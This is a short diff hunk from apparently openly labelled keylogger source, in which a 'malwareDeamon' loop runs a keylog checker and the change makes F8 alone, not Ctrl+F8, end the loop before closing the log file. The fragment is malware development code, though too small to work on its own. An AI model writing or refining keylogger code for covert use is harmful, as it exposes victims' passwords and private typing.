@@ -81,7 +81,7 @@ void malwareDeamon() {
 	while (1) {
 		m.run();//RUN KEYLOG CHECKER
 		//EXIT KEYLOGGER:
-		if (m.gks(VK_F8) && m.gks(VK_CONTROL)) return;
+		if (m.gks(VK_F8)) break;
 		Sleep(1);
 	}
 	ofile.close();
